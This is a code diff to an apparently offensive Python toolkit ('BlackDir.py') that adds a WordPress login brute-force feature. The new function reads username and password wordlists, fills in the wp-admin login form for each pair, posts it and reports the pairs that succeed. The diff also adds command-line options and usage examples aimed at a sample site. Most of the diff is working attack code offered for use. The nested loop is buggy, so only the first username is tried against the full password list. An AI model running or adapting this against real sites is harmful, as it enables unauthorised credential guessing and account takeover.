@@ -651,7 +651,58 @@ def hash_identifier(hashing):
         print(colored("Bit length:"), 128 * 4)
     else:
         print(colored("Not Found !","red"))
+def wordpress(url,username,password):
+    send = {}
+    print(colored("[!] Start Brute Force","red"))
+    if username ==None and password == None:
+        u_file = open("username.txt", "r")
+        p_file = open("password.txt", "r")
+        print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
+        print(colored("File For Users:","green"),os.getcwd()+"/"+"password.txt")
+    elif username != None and password == None:
+        u_file = open(username,"r")
+        p_file = open("password.txt", "r")
+        print(colored("File For Users:","green"),username)
+        print(colored("File For Users:","green"), os.getcwd()+"/"+ "password.txt")
+    elif username == None and password !=None:
+        u_file = open("username.txt", "r")
+        p_file = open(password,"r")
+        print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
+        print(colored("File For Users:","green"),password)
+    else:
+        u_file = open(username, "r")
+        p_file = open(password, "r")
+        print(colored("File For Users:","green"),username)
+        print(colored("File For Users:","green"),password)
 
+    url_edit = url+"/"+"wp-admin"
+    headers = {"Cookie": "wordpress_test_cookie=WP+Cookie+check"}
+    url_req = requests.post(url_edit,headers=headers)
+    if url_req.status_code == 200:
+        for usernames in u_file:
+            usernames = usernames.strip()
+            for passowrds in p_file:
+                passowrds = passowrds.strip()
+                url_source = BeautifulSoup(url_req.content,"html.parser")
+                for url_input in url_source.find_all("input"):
+                    if url_input.get("type") == "text":
+                        input_text_name= url_input.get("name")
+                        send[input_text_name] = usernames
+                    if url_input.get("type") == "password":
+                        input_password_name = url_input.get("name")
+                        send[input_password_name]= passowrds
+                    if url_input.get("type") == "submit":
+                        input_submit_name = url_input.get("name")
+                        input_submit_value = url_input.get("value")
+                        send[input_submit_name] = input_submit_value
+                req_check = requests.post(url_edit,send,headers=headers)
+                if url+"wp-login.php?action=lostpassword"  not in req_check.text:
+                    print("Found !","Username:",usernames,"password:",passowrds)
+                else:
+                    print(colored("Not Found !","red"),"Username:",usernames,"password:",passowrds)
+    else:
+        print(colored("URL is Wrong !","red"))
+        exit(1)
 parser = argparse.ArgumentParser("""
 --spider            : Url to find Directory
 --list              : If you have list
@@ -682,6 +733,10 @@ python3 BlackDir.py --word redvirus --type sha1
 python3 BlackDir.py --word redvirus --type sha256
 python3 BlackDir.py --word redvirus --type sha512
 python3 BlackDir.py --hash_type 5f4dcc3b5aa765d61d8327deb882cf99
+python3 BlackDir.py --wordpress http://ebase.com/
+python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt --ListPassowrd /root/Desktop/pass.txt
+python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt 
+python3 BlackDir.py --wordpress http://ebase.com/ --ListPassword /root/Desktop/pass.txt
 """)
 parser.add_argument("-spider", "--spider")
 parser.add_argument("-list", "--list")
@@ -699,6 +754,9 @@ parser.add_argument("-port", "--port")
 parser.add_argument("-type","--type")
 parser.add_argument("-word","--word")
 parser.add_argument("-hash_type","--hash_type")
+parser.add_argument("-wordpress","--wordpress")
+parser.add_argument("-ListUsername","--ListUsername")
+parser.add_argument("-ListPassword","--ListPassword")
 args = parser.parse_args()
 secure = None
 listuser = args.list
@@ -725,32 +783,37 @@ site = args.country
 hash_type = args.type
 user_word = args.word
 hash_ide = args.hash_type
-if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+url_wordpress = args.wordpress
+usernames = args.ListUsername
+passwords = args.ListPassword
+if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     dorks(dork, site, text)
-elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     spider(url, listuser, secure)
-elif subdomains != None and url == None and dork == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif subdomains != None and url == None and dork == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     sub(subdomains, sublist)
-elif scanner != None and url == None and dork == None and subdomains == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif scanner != None and url == None and dork == None and subdomains == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     xss(scanner)
-elif sql_inection != None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection != None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     sql(sql_inection)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork != None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork != None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     list_dorks(list_dork)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates != None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates != None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     if updates == "check" or updates == "Check":
         update()
     else:
         print(colored("Error ! Please Enter --update check", "red"))
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip != None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip != None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     ip_reverse(ip)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan != None and html == None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan != None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     scanports(portscan)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html != None and hash_type == None and user_word ==None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html != None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     html_injection(html)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type != None and user_word !=None and hash_ide == None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type != None and user_word !=None and hash_ide == None and url_wordpress ==None:
     hash_en(user_word,hash_type)
-elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide != None:
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide != None and url_wordpress ==None:
     hash_identifier(hash_ide)
+elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide == None and url_wordpress !=None:
+    wordpress(url_wordpress,usernames,passwords)
 else:
     logo()
